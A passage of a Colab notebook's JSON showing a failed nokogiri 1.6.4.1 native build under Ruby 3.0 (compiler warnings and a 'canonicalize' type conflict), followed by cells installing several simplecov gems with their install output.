            "                 from xml_cdata.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:44,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_cdata.h:4,\n",
            "                 from xml_cdata.c:1:\n",
            "xml_cdata.c: In function ‘new’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "xml_cdata.c:18:3: note: in expansion of macro ‘rb_scan_args’\n",
            "   18 |   rb_scan_args(argc, argv, \"2*\", &doc, &content, &rest);\n",
            "      |   ^~~~~~~~~~~~\n",
            "compiling xml_comment.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:44,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_comment.h:4,\n",
            "                 from xml_comment.c:1:\n",
            "xml_comment.c: In function ‘new’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "xml_comment.c:18:3: note: in expansion of macro ‘rb_scan_args’\n",
            "   18 |   rb_scan_args(argc, argv, \"2*\", &document, &content, &rest);\n",
            "      |   ^~~~~~~~~~~~\n",
            "compiling xml_document.c\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:42,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h: In function ‘RB_TEST’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/special_consts.h:121:16: warning: unsigned conversion from ‘int’ to ‘VALUE’ {aka ‘long unsigned int’} changes value from ‘-9’ to ‘18446744073709551607’ [-Wsign-conversion]\n",
            "  121 |     return obj & ~RUBY_Qnil;\n",
            "      |                ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/int.h:26,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/char.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘RB_INT2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:88:29: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   88 |     const unsigned long j = i;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:90:29: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   90 |     const long          l = k;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:92:29: warning: conversion to ‘VALUE’ {aka ‘const long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "   92 |     const VALUE         n = m;\n",
            "      |                             ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_idiv’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:123:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  123 |     const SIGNED_VALUE y = x - RUBY_FIXNUM_FLAG;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rbimpl_fix2long_by_shift’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:140:28: warning: conversion to ‘long int’ from ‘VALUE’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "  140 |     const SIGNED_VALUE y = x;\n",
            "      |                            ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_fix2ulong’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:175:12: warning: conversion to ‘long unsigned int’ from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  175 |     return rb_fix2long(x);\n",
            "      |            ^~~~~~~~~~~~~~\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h: In function ‘rb_ulong2num_inline’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/long.h:214:28: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "  214 |         return RB_LONG2FIX(v);\n",
            "      |                            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h: In function ‘RB_ST2FIX’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:45:22: warning: conversion to ‘long int’ from ‘st_data_t’ {aka ‘long unsigned int’} may change the sign of the result [-Wsign-conversion]\n",
            "   45 |     SIGNED_VALUE x = i;\n",
            "      |                      ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:56:24: warning: conversion to ‘long int’ from ‘long unsigned int’ may change the sign of the result [-Wsign-conversion]\n",
            "   56 |     return RB_LONG2FIX(y);\n",
            "      |                        ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/assume.h:29,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/backward/2/assume.h:24,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/defines.h:72,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h: In function ‘RARRAY_PTR’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/core/rarray.h:249:24: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  249 |     return RBIMPL_CAST((VALUE *)RARRAY_CONST_PTR(tmp));\n",
            "      |                        ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/cast.h:33:29: note: in definition of macro ‘RBIMPL_CAST’\n",
            "   33 | # define RBIMPL_CAST(expr) (expr)\n",
            "      |                             ^~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:39,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h: In function ‘rb_alloc_tmp_buffer2’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/memory.h:253:56: warning: conversion to ‘size_t’ {aka ‘long unsigned int’} from ‘long int’ may change the sign of the result [-Wsign-conversion]\n",
            "  253 |     const size_t total_size = rbimpl_size_mul_or_raise(count, elsize);\n",
            "      |                                                        ^~~~~\n",
            "In file included from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "./nokogiri.h: At top level:\n",
            "./nokogiri.h:43: warning: \"MAYBE_UNUSED\" redefined\n",
            "   43 | #  define MAYBE_UNUSED(name) name __attribute__((unused))\n",
            "      | \n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/config.h:23,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:15,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/x86_64-linux-gnu/ruby-3.0.0/ruby/config.h:159: note: this is the location of the previous definition\n",
            "  159 | #define MAYBE_UNUSED(x) __attribute__ ((__unused__)) x\n",
            "      | \n",
            "xml_document.c: In function ‘dealloc’:\n",
            "xml_document.c:46:25: warning: passing argument 2 of ‘rb_st_foreach’ from incompatible pointer type [-Wincompatible-pointer-types]\n",
            "   46 |   st_foreach(node_hash, dealloc_node_i, (st_data_t)doc);\n",
            "      |                         ^~~~~~~~~~~~~~\n",
            "      |                         |\n",
            "      |                         int (*)(xmlNode *, xmlNode *, xmlDoc *) {aka int (*)(struct _xmlNode *, struct _xmlNode *, struct _xmlDoc *)}\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/internal/arithmetic/st_data_t.h:31,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/internal/arithmetic.h:36,\n",
            "                 from /usr/include/ruby-3.0.0/ruby/ruby.h:25,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/ruby-3.0.0/ruby/st.h:141:31: note: expected ‘int (*)(st_data_t,  st_data_t,  st_data_t)’ {aka ‘int (*)(long unsigned int,  long unsigned int,  long unsigned int)’} but argument is of type ‘int (*)(xmlNode *, xmlNode *, xmlDoc *)’ {aka ‘int (*)(struct _xmlNode *, struct _xmlNode *, struct _xmlDoc *)’}\n",
            "  141 | int rb_st_foreach(st_table *, st_foreach_callback_func *, st_data_t);\n",
            "      |                               ^~~~~~~~~~~~~~~~~~~~~~~~~~\n",
            "xml_document.c: In function ‘set_encoding’:\n",
            "xml_document.c:182:12: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  182 |       free((char *) doc->encoding); /* this may produce a gcc cast warning */\n",
            "      |            ^\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:44,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "xml_document.c: In function ‘duplicate_node’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "xml_document.c:325:6: note: in expansion of macro ‘rb_scan_args’\n",
            "  325 |   if(rb_scan_args(argc, argv, \"01\", &level) == 0)\n",
            "      |      ^~~~~~~~~~~~\n",
            "xml_document.c: In function ‘new’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "xml_document.c:348:3: note: in expansion of macro ‘rb_scan_args’\n",
            "  348 |   rb_scan_args(argc, argv, \"0*\", &rest);\n",
            "      |   ^~~~~~~~~~~~\n",
            "xml_document.c: In function ‘create_entity’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "xml_document.c:427:3: note: in expansion of macro ‘rb_scan_args’\n",
            "  427 |   rb_scan_args(argc, argv, \"14\", &name, &type, &external_id, &system_id,\n",
            "      |   ^~~~~~~~~~~~\n",
            "xml_document.c: At top level:\n",
            "xml_document.c:486:14: error: conflicting types for ‘canonicalize’; have ‘VALUE(int,  VALUE *, VALUE)’ {aka ‘long unsigned int(int,  long unsigned int *, long unsigned int)’}\n",
            "  486 | static VALUE canonicalize(int argc, VALUE* argv, VALUE self)\n",
            "      |              ^~~~~~~~~~~~\n",
            "In file included from /usr/include/features.h:486,\n",
            "                 from /usr/include/x86_64-linux-gnu/bits/libc-header-start.h:33,\n",
            "                 from /usr/include/stdlib.h:26,\n",
            "                 from ./nokogiri.h:4,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "/usr/include/x86_64-linux-gnu/bits/mathcalls.h:370:1: note: previous declaration of ‘canonicalize’ with type ‘int(double *, const double *)’\n",
            "  370 | __MATHDECL_1 (int, canonicalize,, (_Mdouble_ *__cx, const _Mdouble_ *__x));\n",
            "      | ^~~~~~~~~~~~\n",
            "In file included from /usr/include/ruby-3.0.0/ruby/ruby.h:44,\n",
            "                 from /usr/include/ruby-3.0.0/ruby.h:38,\n",
            "                 from ./nokogiri.h:33,\n",
            "                 from ./xml_document.h:4,\n",
            "                 from xml_document.c:1:\n",
            "xml_document.c: In function ‘canonicalize’:\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:247:62: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  247 |                      (rb_scan_args_verify(fmt, varc), vars), (char *)fmt, varc)\n",
            "      |                                                              ^\n",
            "/usr/include/ruby-3.0.0/ruby/internal/scan_args.h:365:9: note: in expansion of macro ‘rb_scan_args0’\n",
            "  365 |         rb_scan_args0(                                        \\\n",
            "      |         ^~~~~~~~~~~~~\n",
            "xml_document.c:502:3: note: in expansion of macro ‘rb_scan_args’\n",
            "  502 |   rb_scan_args(argc, argv, \"03\", &mode, &incl_ns, &with_comments);\n",
            "      |   ^~~~~~~~~~~~\n",
            "xml_document.c:529:15: warning: cast discards ‘const’ qualifier from pointer target type [-Wcast-qual]\n",
            "  529 |       ns[i] = (xmlChar*) ptr;\n",
            "      |               ^\n",
            "make: *** [Makefile:245: xml_document.o] Error 1\n",
            "\n",
            "make failed, exit code 2\n",
            "\n",
            "Gem files will remain installed in /var/lib/gems/3.0.0/gems/nokogiri-1.6.4.1 for inspection.\n",
            "Results logged to /var/lib/gems/3.0.0/extensions/x86_64-linux/3.0.0/nokogiri-1.6.4.1/gem_make.out\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov-db"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "-4e-iDpwrAYH",
        "outputId": "dd915823-5c15-4eb4-d218-5a8de5088e69"
      },
      "execution_count": 57,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching timeout-0.4.2.gem\n",
            "Fetching sqlite3-2.0.4.gem\n",
            "Fetching mini_portile2-2.8.8.gem\n",
            "Fetching concurrent-ruby-1.3.4.gem\n",
            "Fetching tzinfo-2.0.6.gem\n",
            "Fetching securerandom-0.3.2.gem\n",
            "Fetching i18n-1.14.6.gem\n",
            "Fetching connection_pool-2.4.1.gem\n",
            "Fetching benchmark-0.4.0.gem\n",
            "Fetching simplecov-db-0.1.0.gem\n",
            "Fetching activesupport-7.1.5.gem\n",
            "Fetching activemodel-7.1.5.gem\n",
            "Fetching activerecord-7.1.5.gem\n",
            "Successfully installed mini_portile2-2.8.8\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed sqlite3-2.0.4\n",
            "Successfully installed timeout-0.4.2\n",
            "Successfully installed concurrent-ruby-1.3.4\n",
            "Successfully installed tzinfo-2.0.6\n",
            "Successfully installed securerandom-0.3.2\n",
            "PSA: I18n will be dropping support for Ruby < 3.2 in the next major release (April 2025), due to Ruby's end of life for 3.1 and below (https://endoflife.date/ruby). Please upgrade to Ruby 3.2 or newer by April 2025 to continue using future versions of this gem.\n",
            "Successfully installed i18n-1.14.6\n",
            "Successfully installed connection_pool-2.4.1\n",
            "Successfully installed benchmark-0.4.0\n",
            "Successfully installed activesupport-7.1.5\n",
            "Successfully installed activemodel-7.1.5\n",
            "Successfully installed activerecord-7.1.5\n",
            "Successfully installed simplecov-db-0.1.0\n",
            "Parsing documentation for mini_portile2-2.8.8\n",
            "Installing ri documentation for mini_portile2-2.8.8\n",
            "Parsing documentation for sqlite3-2.0.4\n",
            "Installing ri documentation for sqlite3-2.0.4\n",
            "Parsing documentation for timeout-0.4.2\n",
            "Installing ri documentation for timeout-0.4.2\n",
            "Parsing documentation for concurrent-ruby-1.3.4\n",
            "Installing ri documentation for concurrent-ruby-1.3.4\n",
            "Parsing documentation for tzinfo-2.0.6\n",
            "Installing ri documentation for tzinfo-2.0.6\n",
            "Parsing documentation for securerandom-0.3.2\n",
            "Installing ri documentation for securerandom-0.3.2\n",
            "Parsing documentation for i18n-1.14.6\n",
            "Installing ri documentation for i18n-1.14.6\n",
            "Parsing documentation for connection_pool-2.4.1\n",
            "Installing ri documentation for connection_pool-2.4.1\n",
            "Parsing documentation for benchmark-0.4.0\n",
            "Installing ri documentation for benchmark-0.4.0\n",
            "Parsing documentation for activesupport-7.1.5\n",
            "Installing ri documentation for activesupport-7.1.5\n",
            "Parsing documentation for activemodel-7.1.5\n",
            "Installing ri documentation for activemodel-7.1.5\n",
            "Parsing documentation for activerecord-7.1.5\n",
            "Installing ri documentation for activerecord-7.1.5\n",
            "Parsing documentation for simplecov-db-0.1.0\n",
            "Installing ri documentation for simplecov-db-0.1.0\n",
            "Done installing documentation for mini_portile2, sqlite3, timeout, concurrent-ruby, tzinfo, securerandom, i18n, connection_pool, benchmark, activesupport, activemodel, activerecord, simplecov-db after 31 seconds\n",
            "13 gems installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov-erb"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "s8tyrwIXrQcV",
        "outputId": "d4092f84-75e8-426d-cd0b-b30e2d0a7d80"
      },
      "execution_count": 59,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching simplecov-erb-1.0.1.gem\n",
            "Successfully installed simplecov-erb-1.0.1\n",
            "Parsing documentation for simplecov-erb-1.0.1\n",
            "Installing ri documentation for simplecov-erb-1.0.1\n",
            "Done installing documentation for simplecov-erb after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov-html"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "efN604ifrUI9",
        "outputId": "8da80d16-96a1-4908-d753-2821ed429953"
      },
      "execution_count": 61,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Successfully installed simplecov-html-0.13.1\n",
            "Parsing documentation for simplecov-html-0.13.1\n",
            "Done installing documentation for simplecov-html after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov-json"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KdxsAQjfrV32",
        "outputId": "2ff2dbb5-c346-4433-a184-9370c9271a08"
      },
      "execution_count": 63,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching simplecov-json-0.2.3.gem\n",
            "Successfully installed simplecov-json-0.2.3\n",
            "Parsing documentation for simplecov-json-0.2.3\n",
            "Installing ri documentation for simplecov-json-0.2.3\n",
            "Done installing documentation for simplecov-json after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov-lcov"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "7nanSdgLrXp1",
        "outputId": "b3dab360-6b4e-4d72-a5cc-03474ade3e1d"
      },
      "execution_count": 65,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching simplecov-lcov-0.8.0.gem\n",
            "Successfully installed simplecov-lcov-0.8.0\n",
            "Parsing documentation for simplecov-lcov-0.8.0\n",
            "Installing ri documentation for simplecov-lcov-0.8.0\n",
            "Done installing documentation for simplecov-lcov after 0 seconds\n",
